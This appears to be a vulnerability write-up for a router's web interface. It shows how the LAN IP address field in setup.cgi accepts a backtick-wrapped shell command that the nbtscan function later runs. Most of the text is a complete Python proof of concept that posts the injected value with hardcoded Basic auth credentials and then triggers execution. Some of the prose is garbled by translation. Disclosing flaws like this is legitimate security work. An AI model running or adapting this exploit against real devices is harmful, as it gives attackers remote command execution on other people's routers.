 The LAN Setup function on the start.htm interface does not detect the backend of the configured lan_ipaddr, and users can construct malicious code through this function, access the setup.cgi nbtscan function, execute malicious code, and remotely execute commands.

The home page of Atache de Ves will invoke the Embutskán function

![image](https://github.com/user-attachments/assets/f4249368-d0e9-4272-b0c2-4703081b9782)

  setup.cgi's nbtscan function does not detect lan_ipaddr, and if the lan_ipaddr is constructed as malicious code and inserted, it will cause arbitrary command execution.

![image](https://github.com/user-attachments/assets/65fa23e5-5de5-42b3-b435-5e2723f62967)

There is a LAN Setup function in the home page, and you can set the IP addr

![image](https://github.com/user-attachments/assets/b71d1e6a-c259-4869-94b5-b0efc1730a1e)

Set c4_sysLANIPAddr=192.168.0.1\`printf HELLOWORLD >/tmp/hacked\` to send the packet

![image](https://github.com/user-attachments/assets/d1d2f638-96bf-4628-ba14-32ea6ce282ed)

Then tap on Atache de Ves to trigger Embutscan

![image](https://github.com/user-attachments/assets/3a3d96dd-347c-4125-8bda-547abc42d40e)

#POC






```python
import requests


# POST /setup.cgi HTTP/1.1
# Host: 192.168.0.1
# Content-Length: 676
# Cache-Control: max-age=0
# Authorization: Basic YWRtaW46cGFzc3dvcmQ=
# Upgrade-Insecure-Requests: 1
# Origin: http://192.168.0.1
# Content-Type: application/x-www-form-urlencoded
# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
# Referer: http://192.168.0.1/lan.htm&todo=cfg_init
# Accept-Encoding: gzip, deflate, br
# Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7
# Cookie: uid=82RDagwWO
# Connection: close

# sysLANIPAddr1=192&sysLANIPAddr2=168&sysLANIPAddr3=0&sysLANIPAddr4=1&sysLANSubnetMask1=255&sysLANSubnetMask2=255&sysLANSubnetMask3=255&sysLANSubnetMask4=0&sysRIPDirection=0&sysRIPVersion=1&sysPoolStartingAddr1=192&sysPoolStartingAddr2=168&sysPoolStartingAddr3=0&sysPoolStartingAddr4=2&sysPoolFinishAddr1=192&sysPoolFinishAddr2=168&sysPoolFinishAddr3=0&sysPoolFinishAddr4=254&apply=Apply&h_sysRIPDirection=0&h_sysRIPVersion=1&h_dhcp_server=disable&h_acc_lan=disable&c4_sysLANIPAddr=192.168.0.1&c4_sysLANSubnetMask=255.255.255.0&c4_sysPoolStartingAddr=192.168.0.2&c4_sysPoolFinishAddr=192.168.0.254&h_ruleSelect=0&h_natEnable=enabled&todo=save&this_file=lan.htm&next_file=lan.htm

cmd = "`printf HELLOWORLD >/tmp/hacked`"

burp0_url = "http://192.168.0.1/setup.cgi"
burp0_headers = {
    "Host": "192.168.0.1",
    "Content-Length": "676",
    "Cache-Control": "max-age=0",
    "Authorization": "Basic YWRtaW46cGFzc3dvcmQ=",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "http://192.168.0.1",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://192.168.0.1/lan.htm&todo=cfg_init",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7",
    "Cookie": "uid=82RDagwWO",
    "Connection": "close"
}
burp0_data = {
    "sysLANIPAddr1": "192",
    "sysLANIPAddr2": "168",
    "sysLANIPAddr3": "0",
    "sysLANIPAddr4": "1",
    "sysLANSubnetMask1": "255",
    "sysLANSubnetMask2": "255",
    "sysLANSubnetMask3": "255",
    "sysLANSubnetMask4": "0",
    "sysRIPDirection": "0",
    "sysRIPVersion": "1",
    "sysPoolStartingAddr1": "192",
    "sysPoolStartingAddr2": "168",
    "sysPoolStartingAddr3": "0",
    "sysPoolStartingAddr4": "2",
    "sysPoolFinishAddr1": "192",
    "sysPoolFinishAddr2": "168",
    "sysPoolFinishAddr3": "0",
    "sysPoolFinishAddr4": "254",
    "apply": "Apply",
    "h_sysRIPDirection": "0",
    "h_sysRIPVersion": "1",
    "h_dhcp_server": "disable",
    "h_acc_lan": "disable",
    "c4_sysLANIPAddr": f"192.168.0.1{cmd}",
    "c4_sysLANSubnetMask": "255.255.255.0",
    "c4_sysPoolStartingAddr": "192.168.0.2",
    "c4_sysPoolFinishAddr": "192.168.0.254",
    "h_ruleSelect": "0",
    "h_natEnable": "enabled",
    "todo": "save",
    "this_file": "lan.htm",
    "next_file": "lan.htm"
}

response = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
# print(response.text)
print("burp0_posted . . .")
print("------------------")

# GET /setup.cgi?todo=nbtscan&next_file=devices.htm HTTP/1.1
# Host: 192.168.0.1
# Authorization: Basic YWRtaW46cGFzc3dvcmQ=
# Upgrade-Insecure-Requests: 1
# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
# Referer: http://192.168.0.1/menu.htm
# Accept-Encoding: gzip, deflate, br
# Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7
# Cookie: uid=82RDagwWO
# Connection: close

burp1_url = "http://192.168.0.1/setup.cgi"
burp1_headers = {
    "Host": "192.168.0.1",
    "Authorization": "Basic YWRtaW46cGFzc3dvcmQ=",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://192.168.0.1/menu.htm",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7",
    "Cookie": "uid=82RDagwWO",
    "Connection": "close"
}
burp1_params = {
    "todo": "nbtscan",
    "next_file": "devices.htm"
}

response = requests.get(burp1_url, headers=burp1_headers, params=burp1_params)
# print(response.text)    
print("burp1_posted . . .")

```
![image](https://github.com/user-attachments/assets/3d35060e-4f0f-43c6-a189-d4a88ed503e2)




